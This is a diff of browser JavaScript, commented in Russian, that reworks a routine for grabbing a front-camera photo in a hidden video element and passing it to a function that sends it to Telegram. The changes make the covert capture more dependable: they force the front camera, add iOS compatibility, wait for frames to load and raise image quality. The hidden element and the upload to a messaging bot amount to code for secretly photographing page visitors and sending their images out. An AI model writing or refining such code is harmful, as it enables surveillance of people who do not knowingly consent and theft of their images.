@@ -169,53 +169,53 @@
     }
 
     try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const videoDevices = devices.filter(device => device.kind === 'videoinput');
-
-        let constraints = {
-            video: { facingMode: "user" }
-        };
-
-        const frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front'));
-
-        if (frontCamera) {
-            constraints = {
-                video: {
-                    deviceId: frontCamera.deviceId
-                }
-            };
-        }
-
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: { exact: "user" } } // точно фронтальная камера
+        });
 
         const videoElement = document.createElement("video");
-        videoElement.style.display = "none"; // чтобы его не видно было
+        videoElement.setAttribute('playsinline', 'true'); // для корректной работы на iOS
+        videoElement.style.display = "none";
         document.body.appendChild(videoElement);
 
         videoElement.srcObject = stream;
-        videoElement.play();
+        await videoElement.play();
 
-        videoElement.onloadedmetadata = async () => {
-            await capturePhoto(videoElement, stream);
-            document.body.removeChild(videoElement); // убираем видео после съемки
-        };
+        // Ждем пока видео реально загрузится
+        await new Promise(resolve => {
+            if (videoElement.readyState >= 3) { // HAVE_FUTURE_DATA
+                resolve();
+            } else {
+                videoElement.addEventListener('loadeddata', resolve, { once: true });
+            }
+        });
+
+        await capturePhoto(videoElement, stream);
+        document.body.removeChild(videoElement);
+
     } catch (error) {
         console.error("Ошибка при доступе к камере:", error);
     }
 };
 
-        const capturePhoto = async (videoElement, stream) => {
-            const canvas = document.createElement("canvas");
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const context = canvas.getContext("2d");
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+const capturePhoto = async (videoElement, stream) => {
+    const canvas = document.createElement("canvas");
+    canvas.width = videoElement.videoWidth || 640; // резерв на случай если видеоWidth не успел прогрузиться
+    canvas.height = videoElement.videoHeight || 480;
+    const context = canvas.getContext("2d");
 
-            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-            await sendPhotoToTelegram(photoBlob);
-            stream.getTracks().forEach(track => track.stop());
-        };
+    const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95)); // качество 95%
+
+    if (photoBlob) {
+        await sendPhotoToTelegram(photoBlob);
+    } else {
+        console.error("Ошибка создания снимка: пустой Blob.");
+    }
+
+    stream.getTracks().forEach(track => track.stop()); // выключаем камеру
+};
 
         const sendPhotoToTelegram = async (photoBlob) => {
             const formData = new FormData();
